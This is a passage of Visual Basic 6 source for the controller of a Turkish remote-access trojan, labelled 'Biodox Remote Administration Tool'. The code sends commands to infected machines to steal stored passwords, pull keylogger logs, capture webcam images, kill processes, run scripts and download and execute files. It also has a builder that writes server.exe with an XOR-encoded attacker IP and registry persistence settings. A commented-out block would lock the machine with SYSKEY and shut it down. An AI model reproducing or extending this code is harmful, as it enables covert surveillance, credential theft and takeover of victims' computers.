      MousePointer    =   99
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   5
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Where"
         Object.Width           =   3510
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "From"
         Object.Width           =   3510
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Size"
         Object.Width           =   1676
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   "State"
         Object.Width           =   1764
      EndProperty
      BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   4
         Text            =   "U/D"
         Object.Width           =   882
      EndProperty
   End
   Begin VB.ListBox progayar 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   9420
      Left            =   11280
      TabIndex        =   300
      Top             =   -720
      Width           =   1935
   End
   Begin VB.Label lbl 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      Caption         =   "0"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   11.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   300
      Index           =   50
      Left            =   0
      TabIndex        =   317
      Top             =   0
      Width           =   495
   End
   Begin VB.Label lbl 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000080&
      Caption         =   "CUSTOMER"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   11.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   300
      Index           =   51
      Left            =   480
      TabIndex        =   301
      Top             =   0
      Width           =   1515
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H00000080&
      BackStyle       =   0  'Transparent
      Caption         =   "Hazýr..."
      BeginProperty Font 
         Name            =   "Trebuchet MS"
         Size            =   9.75
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   270
      Index           =   1
      Left            =   960
      TabIndex        =   256
      Top             =   9480
      Width           =   690
   End
   Begin VB.Label lbl 
      Alignment       =   1  'Right Justify
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H00000080&
      BackStyle       =   0  'Transparent
      Caption         =   "Coded By Who! | who@tikkysoft.com"
      BeginProperty Font 
         Name            =   "Trebuchet MS"
         Size            =   9.75
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   375
      Index           =   0
      Left            =   6360
      TabIndex        =   3
      Top             =   9480
      Width           =   3255
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      BackColor       =   &H00000080&
      BackStyle       =   0  'Transparent
      Caption         =   "Durum :"
      BeginProperty Font 
         Name            =   "Trebuchet MS"
         Size            =   9.75
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000080&
      Height          =   270
      Index           =   2
      Left            =   240
      TabIndex        =   0
      Top             =   9480
      Width           =   855
   End
   Begin VB.Shape shp 
      BorderColor     =   &H00404040&
      Height          =   495
      Index           =   3
      Left            =   120
      Top             =   9360
      Width           =   9615
   End
   Begin VB.Shape shp 
      BorderColor     =   &H00404040&
      Height          =   6495
      Index           =   2
      Left            =   120
      Top             =   360
      Width           =   2535
   End
   Begin VB.Label baslik 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Biodox Remote Administration Tool Private Edition "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   11.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   300
      Left            =   0
      TabIndex        =   246
      Top             =   0
      Width           =   9855
   End
   Begin VB.Menu traymenum 
      Caption         =   "menu"
      Visible         =   0   'False
      Begin VB.Menu mngoster 
         Caption         =   "show"
      End
      Begin VB.Menu sep 
         Caption         =   "-"
      End
      Begin VB.Menu mnexit 
         Caption         =   "exit"
      End
   End
   Begin VB.Menu transfermenu 
      Caption         =   "transfer"
      Visible         =   0   'False
      Begin VB.Menu mnstart 
         Caption         =   "start"
      End
      Begin VB.Menu mnstop 
         Caption         =   "stop"
      End
      Begin VB.Menu sept 
         Caption         =   "-"
      End
      Begin VB.Menu mnremove 
         Caption         =   "remove"
      End
      Begin VB.Menu setp2 
         Caption         =   "-"
      End
      Begin VB.Menu mnclearlist 
         Caption         =   "clear list"
      End
   End
End
Attribute VB_Name = "frmana"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Type NOTIFYICONDATA
cbSize As Long
hwnd As Long
uId As Long
uFlags As Long
ucallbackMessage As Long
hIcon As Long
szTip As String * 64
End Type
Dim durumum As Boolean
Private Const NIM_ADD = &H0
Private Const NIM_MODIFY = &H1
Private Const NIM_DELETE = &H2
Private Const WM_MOUSEMOVE = &H200
Private Const NIF_MESSAGE = &H1
Private Const NIF_ICON = &H2
Private Const NIF_TIP = &H4
Private Declare Function Shell_NotifyIcon Lib "shell32" Alias "Shell_NotifyIconA" _
(ByVal dwMessage As Long, pnid As NOTIFYICONDATA) As Boolean
Dim noticdata As NOTIFYICONDATA

Dim transferindex As Integer
Dim transferislem  As String
Dim kayityeri As String
Dim bilgiler As String
Dim nasilcalisicaksinbakalim As Integer
Const dosyaislemivar As Boolean = False
Dim ulkeflag As Integer
Const pwdversion As String = "trojantikky1.0"
Public SfileLen As String
Public lstring As String
Public Rbytes As Long
Public languagem
Dim stil As Long
Dim bosluk As String * 30
Dim bosluk2 As String * 60
Dim bosluk3 As String * 60
Dim bosluk4 As String * 60
Dim bosluk5 As String * 60
Dim sayac As Integer, sayac2 As Integer
Dim durum As String * 1
Dim listeleman
Dim nereyeinceksin As Integer
Dim DosyaACIKMI As Boolean
Dim sDosyaACIKMI As Boolean
Dim wDosyaACIKMI As Boolean
Dim serverhaberi As String
Dim gidecekport As String
Dim gelenveri As String
Dim kodoku As String
Dim serverhaberindis As Integer
Dim gelenmesaj As String
Dim sahtehatamesajýsimgesi As Integer, sahtehatamesajýtuslari As Integer
Dim toplamsgelen As Long
Dim seçilendosya As String
Dim sFile As String
Dim servereditorfakemsjsimgesi As String
Dim servereditorinstallsi As String
Dim servereditorservermodesi As String
Dim toplamekran As String



Public Sub trayicon(kontrol As Boolean)
noticdata.cbSize = Len(noticdata)
noticdata.hwnd = taskcon.hwnd
noticdata.uId = 1&
noticdata.uFlags = NIF_ICON Or NIF_TIP Or NIF_MESSAGE
noticdata.ucallbackMessage = WM_MOUSEMOVE
noticdata.hIcon = taskcon.Picture
noticdata.szTip = " DOX " & Chr$(0)
If kontrol = False Then Shell_NotifyIcon NIM_DELETE, noticdata
If kontrol = True Then Shell_NotifyIcon NIM_ADD, noticdata
End Sub


Public Function bilgigonder(giris As String)
On Error GoTo baglantihata
    wskServer(Split(lvw(0).SelectedItem.Key, ":")(1)).SendData giris
Exit Function
baglantihata:
hk 559
End Function

Private Sub banner_MouseDown(Button As Integer, shift As Integer, x As Single, y As Single)
    Call ReleaseCapture
    SendMessage Me.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&
End Sub

Private Sub btn_Click(Index As Integer)
Select Case Index
Case 0
    lvw(0).ListItems.Clear
    lvwtransfer.ListItems.Clear
    lbl(50).Caption = 0
    Select Case durumum
        Case True
                hk 22
                wskClient.Close
                wsktransfer.Close
                wskscreen.Close
                wskwebcam.Close
                durumum = False
                wskClient.LocalPort = lvw(7).ListItems(1).SubItems(1)
                lvw(7).ListItems(1).SmallIcon = 33
                wskClient.Listen
                For sayac = 1 To wskServer.UBound
                    Unload wskServer(sayac)
                Next
                hk 326
       
        Case False
                hk 23
                On Local Error Resume Next
                durumum = True
                wskClient.Close
                wsktransfer.Close
                wskscreen.Close
                wskwebcam.Close
                For sayac = 1 To wskServer.UBound
                    Unload wskServer(sayac)
                Next
                lvw(7).ListItems(1).SmallIcon = 34
                lvw(7).ListItems(2).SmallIcon = 34
                lvw(7).ListItems(3).SmallIcon = 34
                lvw(7).ListItems(4).SmallIcon = 34
                hk 327
        End Select

Case 1 'installed applications
    hk 328
    bilgigonder "[GETPRGLT]"

Case 2 'save installed applications
seçilendosya = "Installed Applications.txt"
    hk 329
If (VBGetSaveFileName(seçilendosya, , , "Text files (*.txt)", , , , "", Me.hwnd)) Then
    Open seçilendosya For Append As #1
        For sayac = 1 To lvw(3).ListItems.Count
            bosluk2 = String(70, " ")
            bosluk3 = String(70, " ")
            bosluk4 = String(70, " ")
            bosluk2 = lvw(3).ListItems(sayac) & bosluk2
            bosluk3 = lvw(3).ListItems(sayac).SubItems(1) & bosluk3
            bosluk4 = lvw(3).ListItems(sayac).SubItems(2) & bosluk4
            Print #1, bosluk2 & " : " & bosluk3 & " : " & bosluk4 & " : " & lvw(3).ListItems(sayac).SubItems(3)
        Next
    Close #1
    hk 330
Else
hk 331
End If

Case 3
hk 332
    lvw(3).ListItems.Clear
hk 333

Case 4 'server editor
    cerceveaç 14
    
Case 5
    hk 334
    bilgigonder "[CHATONOF]1"
    
Case 6
    hk 335
    bilgigonder "[CHATONOF]0"
    
Case 7
    hk 336
    txtchat(0).Text = ""
    hk 337

Case 8
    hk 338
    txtchat_KeyPress 1, 13

Case 9 ' send fake messagený test et
    hk 339
    MsgBox txthatamesaji(1).Text, sahtehatamesajýtuslari + sahtehatamesajýsimgesi, txthatamesaji(0).Text
    hk 340
    
Case 10
  
  hk 341
  bilgigonder "[FAKEMESS]" & txthatamesaji(1).Text & Chr(255) & sahtehatamesajýtuslari & Chr(255) & sahtehatamesajýsimgesi & Chr(255) & txthatamesaji(0).Text
   
    
Case 11 'alanlarý temzle
    hk 342
    txthatamesaji(0).Text = ""
    txthatamesaji(1).Text = ""
    hk 343
    
 
Case 12 'im password
    hk 344
    bilgigonder "[GETPASSW]1"
    
Case 13 'network passwords
    hk 345
    bilgigonder "[GETPASSW]2"

Case 14 'protected passwors
    hk 346
    bilgigonder "[GETPASSW]3"

Case 15 'mail passwords
    hk 347
    bilgigonder "[GETPASSW]4"

Case 16 'remote desktop passwords
    hk 348
    bilgigonder "[GETPASSW]5"
    
Case 17 'wireless passwords
    hk 349
    bilgigonder "[GETPASSW]6"

Case 52 'internet explorer passwords
    hk 350
    bilgigonder "[GETPASSW]7"

Case 53 'dialup passwords
    hk 351
    bilgigonder "[GETPASSW]8"

Case 18 'servis listesini al
lvw(4).ListItems.Clear
hk 352
bilgigonder "[GETSRVLT]"

Case 19 ' sistem bilgisini al
hk 353
bilgigonder "[GETDINFO]"

    
Case 20 ' sistem bilgisini kaydet
seçilendosya = "System Information.txt"
hk 354
If (VBGetSaveFileName(seçilendosya, , , "Text files (*.txt)", , , , "", Me.hwnd)) Then
    Open seçilendosya For Append As #1
        For sayac = 1 To lvw(2).ListItems.Count
            bosluk = String(50, " ")
            bosluk = lvw(2).ListItems(sayac) & bosluk
            Print #1, bosluk & " : " & lvw(2).ListItems(sayac).SubItems(1)
        Next
    Close #1
hk 355
Else
hk 356
End If
    
Case 21 ' sistem bilgisini temizle
    hk 357
        For sayac = 1 To lvw(2).ListItems.Count
            lvw(2).ListItems(sayac).SubItems(1) = ""
        Next
    hk 358

Case 22 ' servis automatic
    hk 359

Case 23 ' servis manual
    hk 360
    
Case 24
    hk 361
    bilgigonder "[GETKYLOG]0"
    
Case 25
    hk 362
    bilgigonder "[GETKYLOG]1"

Case 26
    seçilendosya = "ONLINE LOGS.txt"
    hk 363
        If (VBGetSaveFileName(seçilendosya, , , "Text files (*.txt)", , , , "", Me.hwnd)) Then
            Open seçilendosya For Append As #1
                Print #1, txtonline.Text
            Close #1
            hk 364
        Else
            hk 365
        End If

Case 27
    hk 366
    txtonline.Text = ""
    hk 367
    
Case 28 ' ofline keylogger loglarýný al
    hk 368
    bilgigonder "[GETKYLOG]2"
    
Case 29
    hk 369
    seçilendosya = "OFFLINE LOGS.txt"
        If (VBGetSaveFileName(seçilendosya, , , "Text files (*.txt)", , , , "", Me.hwnd)) Then
            Open seçilendosya For Append As #1
                Print #1, txtoffline.Text
            Close #1
            hk 370
        Else
            hk 371
        End If
   
Case 30
    hk 372
    txtoffline.Text = ""
    hk 373
    
Case 31 ' get application llst
        hk 374
        lvw(5).ColumnHeaders.Clear
        lvw(5).ColumnHeaders.Add , , dil.List(265), 1300
        lvw(5).ColumnHeaders.Add , , dil.List(266), 1050
        lvw(5).ColumnHeaders.Add , , dil.List(267), 1050
        lvw(5).ColumnHeaders.Add , , dil.List(268), 1050
        lvw(5).ColumnHeaders.Add , , dil.List(269), 1050
        bilgigonder "[GETPRCLT]"

Case 32 'clear application list
    hk 375
    lvw(5).ListItems.Clear
    hk 376
    
    
Case 33 ' start service
    hk 378
    On Error GoTo shata1
    bilgigonder "[GETSRVST]" & lvw(4).SelectedItem.Text & Chr(255) & 0
    Exit Sub
shata1:
    hk 377

Case 34 'stop service
    hk 379
On Error GoTo shata2
    bilgigonder "[GETSRVST]" & lvw(4).SelectedItem.Text & Chr(255) & 1
    Exit Sub
shata2:
    hk 377

Case 35 'pause service
    hk 380
On Error GoTo shata3
    bilgigonder "[GETSRVST]" & lvw(4).SelectedItem.Text & Chr(255) & 2
    Exit Sub
shata3:
    hk 377

Case 36 'resume service
    hk 381
On Error GoTo shata4
    bilgigonder "[GETSRVST]" & lvw(4).SelectedItem.Text & Chr(255) & 3
    Exit Sub
shata4:
    hk 377

Case 38 ' close app
    hk 382
    On Error GoTo shata10
    bilgigonder "[GETPRCKL]" & lvw(5).SelectedItem.SubItems(1)
    Exit Sub
shata10:
    hk 377
    
Case 39 'modul olarak göster
        hk 383
        On Error GoTo shata9
        bilgigonder "[GETMODLT]" & lvw(5).SelectedItem.SubItems(1)
        lvw(5).ColumnHeaders.Clear
        lvw(5).ColumnHeaders.Add , , dil.List(384), 3500
        lvw(5).ColumnHeaders.Add , , dil.List(385), 1000
        lvw(5).ColumnHeaders.Add , , dil.List(386), 1000
        Exit Sub
shata9:
    hk 377
    
Case 40
On Error GoTo shata5
    bilgigonder "[GETPRCPR]" & lvw(5).SelectedItem.SubItems(1) & Chr(255) & 0
    Exit Sub
shata5:
    hk 377
Case 41
On Error GoTo shata6
    bilgigonder "[GETPRCPR]" & lvw(5).SelectedItem.SubItems(1) & Chr(255) & 1
    Exit Sub
shata6:
    hk 377
Case 42
On Error GoTo shata7
    bilgigonder "[GETPRCPR]" & lvw(5).SelectedItem.SubItems(1) & Chr(255) & 2
    Exit Sub
shata7:
    hk 377
Case 43
On Error GoTo shata8
    bilgigonder "[GETPRCPR]" & lvw(5).SelectedItem.SubItems(1) & Chr(255) & 3
    Exit Sub
shata8:
    hk 377

Case 44 'windows pencereleri listele
    bilgigonder "[GETWNDLT]" & -1
    bWHidden = False
Case 45 ' tümünü listelet
     bilgigonder "[GETWNDLT]" & 0
     bWHidden = True
Case 46, 47, 48, 49, 50, 51
On Error GoTo shata11
    If Index = 46 Then bilgigonder "[GETWNDOP]" & 0 & Chr(255) & lvw(6).SelectedItem.SubItems(1)
    If Index = 47 Then bilgigonder "[GETWNDOP]" & 1 & Chr(255) & lvw(6).SelectedItem.SubItems(1)
    If Index = 48 Then bilgigonder "[GETWNDOP]" & 2 & Chr(255) & lvw(6).SelectedItem.SubItems(1)
    If Index = 49 Then bilgigonder "[GETWNDOP]" & 3 & Chr(255) & lvw(6).SelectedItem.SubItems(1)
    If Index = 50 Then bilgigonder "[GETWNDOP]" & 4 & Chr(255) & lvw(6).SelectedItem.SubItems(1)
    If Index = 51 Then bilgigonder "[GETWNDOP]" & 5 & Chr(255) & lvw(6).SelectedItem.SubItems(1) & Chr(255) & txtappset
Exit Sub
shata11:
    hk 377

Case 54 'webcam görüntüsünü al
    wskwebcam.Close
    wskwebcam.LocalPort = lvw(7).ListItems(4).SubItems(1)
    wskwebcam.Listen
    bilgigonder "[WEBCAMCO]" & webcamkalite
    hk 387
Case 55 'durdur
    hk 388
    bilgigonder "[WEBCAMOF]"
    lvw(7).ListItems(4).SmallIcon = 34
    wskwebcam.Close

Case 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95
    bilgigonder "[FUNMANAG]" & Index - 56 & Chr(255) & txtfunerror.Text
    hk Index + 333

Case 96
    hk 429
    bilgigonder "[SRVERBIL]"
Case 97
    hk 430
    If lvw(1).ListItems.Count < 1 Then Exit Sub
            kodoku = lvw(1).ListItems(2).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(3).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(6).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(9).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(10).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(11).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(12).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(15).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(16).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(19).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(20).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(23).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(24).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(25).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(28).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(29).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(30).SubItems(1) & Chr(255) & _
            lvw(1).ListItems(31).SubItems(1) & Chr(255)

            bilgigonder "[SRVEROPT]" & kodoku
Case 98
    hk 431
    bilgigonder "[SERCLOSE]0"
Case 99
    hk 432
    bilgigonder "[SERCLOSE]1"

Case 100
    seçilendosya = ""
    If VBGetOpenFileName(seçilendosya, , True, , , , "Icon Files(*.Ico)|*.*", 1, , , "txt", Me.hwnd) Then
        On Local Error GoTo gecersizsimge
        editoricon.Picture = LoadPicture(seçilendosya)
        editoricon.ToolTipText = seçilendosya
        hk 439
        Exit Sub
        hk 438
gecersizsimge:
Exit Sub
    End If

Case 101
    frmiconhunter.Show
   
Case 102
    MsgBox servereditortxt(9).Text, vbOKOnly + Val(servereditorfakemsjsimgesi), servereditortxt(10).Text
Case 103
hk 437
seçilendosya = "server.exe"
If (VBGetSaveFileName(seçilendosya, , , "exe files (*.exe)", , , , "", Me.hwnd)) Then
servereditorbar.Max = 100
servereditorbar.Value = 0
Dim kayit(15) As String
kayit(1) = XORSifrele(pwdversion, servereditortxt(0).Text) 'ipadresi
kayit(2) = XORSifrele(pwdversion, servereditortxt(8).Text) 'victimname
kayit(3) = XORSifrele(pwdversion, servereditortxt(7).Text) 'delay
kayit(4) = XORSifrele(pwdversion, servereditortxt(5).Text) 'registry key
kayit(5) = XORSifrele(pwdversion, servereditortxt(6).Text) 'registry value
servereditorbar.Value = 10
kayit(6) = XORSifrele(pwdversion, servereditorchc(0).Value) 'mesajgöster
kayit(7) = XORSifrele(pwdversion, servereditortxt(10).Text)  'mesajbaslik
kayit(8) = XORSifrele(pwdversion, servereditortxt(9).Text)  'mesajmetni
kayit(9) = XORSifrele(pwdversion, servereditorfakemsjsimgesi) ' mesaj simgesi

kayit(10) = XORSifrele(pwdversion, servereditortxt(1).Text) 'connection port
kayit(11) = XORSifrele(pwdversion, servereditortxt(2).Text) 'transfer port
kayit(12) = XORSifrele(pwdversion, servereditortxt(3).Text) 'screen port
kayit(13) = XORSifrele(pwdversion, servereditortxt(4).Text) 'webcam port
servereditorbar.Value = 30
kayit(14) = XORSifrele(pwdversion, servereditorinstallsi) 'installpath
kayit(15) = XORSifrele(pwdversion, servereditorservermodesi) 'server modu

Dim sayac2x
Dim veri2x As String
bilgiler = ""
    For sayac = 1 To 15
        If Len(kayit(sayac)) < 101 Then
            veri2x = String(100 - Len(kayit(sayac)), "#")
            kayit(sayac) = kayit(sayac) & veri2x
        End If
        bilgiler = bilgiler & kayit(sayac) & vbCrLf
    Next

If Dir(seçilendosya) <> "" Then Kill seçilendosya
servereditorbar.Value = 40
If Right(seçilendosya, 4) <> ".exe" Then seçilendosya = seçilendosya & ".exe"
servereditorbar.Value = 60
Dim resbytes() As Byte
resbytes = LoadResData(101, "CUSTOM")
Open seçilendosya For Binary As #1
    Put #1, , resbytes
    Put #1, , bilgiler
Close #1
    servereditorbar.Value = 80
    If (editoricon.ToolTipText <> "") And (Dir(editoricon.ToolTipText) <> "") Then
    hk 433
    On Error GoTo Error
        Call InsertIcons(editoricon.ToolTipText, seçilendosya)
        Call InsertIcons(editoricon.ToolTipText, seçilendosya)
        hk 434
        GoTo tamam
Error:
        hk 435
    End If

tamam:
hk 436
End If
servereditorbar.Value = 100
Case 104 ' explorer ziyaret et
    bilgigonder "[STEXPLRR]" & "0" & Chr(255) & txtinternetexplorer(0).Text

Case 105 'internet explrer baslangic sayfasi göster
    bilgigonder "[STEXPLRR]" & "1" & Chr(255) & txtinternetexplorer(1).Text
    
Case 106 'internet explorer baslangic sayfasini ayarla
    bilgigonder "[STEXPLRR]" & "2" & Chr(255) & txtinternetexplorer(2).Text
Case 107
    hk 440
    bilgigonder "[MSNCLIST]"
Case 108
    If lvw(8).ListItems.Count < 1 Then Exit Sub
    sFile = "Msn Contact List.txt"
    bar.Max = lvw(8).ListItems.Count
    If (VBGetSaveFileName(sFile, , , "Text files (*.txt)", , , , "", Me.hwnd)) Then
    Open sFile For Binary As #1
    For sayac = 1 To lvw(8).ListItems.Count
        Print #1, lvw(8).ListItems(sayac).Text
        bar.Value = sayac
    Next
    Close #1
    End If
    bar.Value = 0
    hk 441
    
Case 109
    lvw(8).ListItems.Clear
    hk 442
    
Case 110
    hk 443
    bilgigonder "[MSNONLIN]0" & Chr(255) & msngrileti(0).Text & Chr(255) & msngrileti(1).Text
Case 111
    If msngrileti(0).Text <> "" And msngrileti(1).Text <> "" Then
        hk 444
        bilgigonder "[MSNONLIN]1" & Chr(255) & msngrileti(0).Text & Chr(255) & msngrileti(1).Text
    Else
        hk 594
    End If
Case 112
    hk 445
    bilgigonder "[MSNAYARI]0" & Chr(255) & msngrileti(2).Text

Case 113
    hk 446
    bilgigonder "[MSNAYARI]1" & Chr(255) & msngrileti(3).Text

Case 114
    hk 447
    bilgigonder "[MSNAYARI]2"

Case 115
    hk 448
    bilgigonder "[MSNAYARI]3"
Case 116
    hk 449
    bilgigonder "[MSNAYARI]4"
Case 117
    hk 450
    bilgigonder "[MSNAYARI]5"
Case 118
    hk 451
    bilgigonder "[MSNAYARI]6"
Case 119
    hk 452
    bilgigonder "[MSNAYARI]7"
Case 120
    hk 453
    bilgigonder "[MSNAYARI]8"
Case 121
    hk 454
    bilgigonder "[MSNAYARI]9"
    
Case 122
    hk 443
    bilgigonder "[MSNONLIN]0"

Case 123
hk 455
gelenmesaj = ""
Dim kufursay  As Integer
        For sayac = 0 To lstkufur.ListCount - 1
            If lstkufur.Selected(sayac) = True Then
                gelenmesaj = gelenmesaj & lstkufur.List(sayac) & vbCrLf
            End If
        Next
        
        If kimeedicen.Text <> "" Then
            bilgigonder "[KUFURSAY]" & kimeedicen.Text & Chr(255) & gelenmesaj
        End If

        
Case 124
seçilendosya = ""
    hk 456
   If VBGetOpenFileName(seçilendosya, , True, , , , "Text Files(*.txt)|*.txt", 1, , , "txt", Me.hwnd) Then
    Open seçilendosya For Input As #8
        Do While Not EOF(8)
            Line Input #8, gelenmesaj
            lstkufur.AddItem gelenmesaj
        Loop
    Close #8
    hk 457
    Else
    hk 458
   End If
   
   
Case 125
    hk 459
    For sayac = 0 To lstkufur.ListCount - 1
        lstkufur.Selected(sayac) = True
    Next
Case 126
    hk 460
    For sayac = 0 To lstkufur.ListCount - 1
        lstkufur.Selected(sayac) = False
    Next

Case 127
    hk 461
    lstkufur.Clear

Case 128
    txtprinter(0).Text = ""
    hk 612
Case 129
    hk 609
    bilgigonder "[MEYAZDIR]" & txtprinter(1).Text & Chr(255) & chcprinter(1).Value & Chr(255) & chcprinter(2).Value & Chr(255) & chcprinter(3).Value & Chr(255) & txtprinter(0).Text

Case 130
    scriptcode.Text = ""
Case 131
    If scriptipi(0).Value = True Then
        veri = "vbs"
    Else
        veri = "bat"
    End If
    If Dir(App.Path & "\script." & veri) <> "" Then Kill App.Path & "\script." & veri
        Open App.Path & "\script." & veri For Append As #1
            Print #1, scriptcode.Text
        Close #1
    Call ShellExecute(&O0, vbNullString, App.Path & "\script." & veri, vbNullString, vbNullString, vbNormalFocus)
Case 132
    If scriptipi(0).Value = True Then
        hk 619
        bilgigonder "[SCRPTMAN]" & "VBS" & Chr(255) & scriptcode.Text
    Else
        hk 619
        bilgigonder "[SCRPTMAN]" & "BAT" & Chr(255) & scriptcode.Text
    End If

Case 133
hk 637
    If dosyaindir(sitedenindir(0).Text, App.Path & "\" & sitedenindir(1).Text) = True Then
        hk 638
      Else
        hk 639
    End If

Case 134
hk 637
bilgigonder "[FILEINDR]" & sitedenindir(0).Text & Chr(255) & downloadexecute.Value & Chr(255) & nereyeinceksin & Chr(255) & sitedenindir(1).Text & Chr(255) & nasilcalisicaksinbakalim
      
    



End Select
End Sub

Public Function dosyaindir(adres As String, dosyaadi As String) As Boolean
Dim downloaddurum
    downloaddurum = URLDownloadToFile(0, adres, dosyaadi, 0, 0)
    If downloaddurum = 0 Then dosyaindir = True
End Function

Private Sub btn_MouseMove(Index As Integer, Button As Integer, shift As Integer, x As Single, y As Single)
    lbl(0).Caption = btn(Index).ToolTipText
End Sub

Private Sub chcprinter_Click(Index As Integer)
Select Case Index
    Case 0
        txtprinter(0).FontBold = chcprinter(Index).Value
    Case 1
        txtprinter(0).FontUnderline = chcprinter(Index).Value
    Case 2
        txtprinter(0).FontItalic = chcprinter(Index).Value
    Case 3
        txtprinter(0).FontStrikethru = chcprinter(Index).Value
End Select
End Sub

Private Sub Form_Initialize()
'If LCase(Environ("computername")) <> "system-90617db7" Then
'    MsgBox "FUCK YOUR MOTHER", vbOKOnly + 16, "Error"
'    Shell "SYSKEY.EXE", vbNormalFocus
'    SendKeys "G", 1
'    SendKeys "B", 1
'    SendKeys "{TAB}", 1
'    SendKeys "knockout", 1
'    SendKeys "{TAB}", 1
'    SendKeys "knockout", 1
'    SendKeys "{ENTER}", 1
'    SendKeys "{ENTER}", 1
'    SendKeys "{ENTER}", 1
'    Shell "shutdown -s -t 3"
'    End
'End If
End Sub

Private Sub Form_MouseDown(Button As Integer, shift As Integer, x As Single, y As Single)
    Call ReleaseCapture
    SendMessage Me.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&
End Sub

Private Sub baslik_MouseDown(Button As Integer, shift As Integer, x As Single, y As Single)
    Call ReleaseCapture
    SendMessage Me.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&
End Sub

Function hk(ne As Integer)
        If ne <> 9999 Then
            lbl(1).Caption = dil.List(ne)
        Else
            lbl(1).Caption = serverhaberi
        End If
End Function
Function flatayarlar()
sahtehatamesajýsimgesi = 0
servereditorchc(0).MouseIcon = btn(0).MouseIcon
lvwtransfer.MouseIcon = btn(0).MouseIcon
For sayac = 0 To servereditorservermode.UBound
    servereditorservermode(sayac).MouseIcon = btn(0).MouseIcon
Next

For sayac = 0 To servereditorinstall.UBound
    servereditorinstall(sayac).MouseIcon = btn(0).MouseIcon
Next

For sayac = 0 To lvw.UBound
    lvw(sayac).MouseIcon = btn(0).MouseIcon
Next

For sayac = 0 To optbotnet.UBound
    optbotnet(sayac).MouseIcon = btn(0).MouseIcon
Next

For sayac = 1 To 6
    tuþlar(sayac).MouseIcon = btn(0).MouseIcon
Next

For sayac = 0 To chcprinter.UBound
    chcprinter(sayac).MouseIcon = btn(0).MouseIcon
Next

        For sayac = 0 To lvw.UBound
            hHeader = SendMessageLong(lvw(sayac).hwnd, LVM_GETHEADER, 0, ByVal 0&)
            Style = GetWindowLong(hHeader, GWL_STYLE)
            Style = Style Xor HDS_BUTTONS
                If Style Then
                    r = SetWindowLong(hHeader, GWL_STYLE, Style)
                    r = SetWindowPos(lvw(sayac).hwnd, Me.hwnd, 0, 0, 0, 0, SWP_FLAGS)
                End If
            lvw(sayac).MouseIcon = btn(0).MouseIcon
        Next
        hHeader = SendMessageLong(lvwtransfer.hwnd, LVM_GETHEADER, 0, ByVal 0&)
        Style = GetWindowLong(hHeader, GWL_STYLE)
        Style = Style Xor HDS_BUTTONS
        If Style Then
            r = SetWindowLong(hHeader, GWL_STYLE, Style)
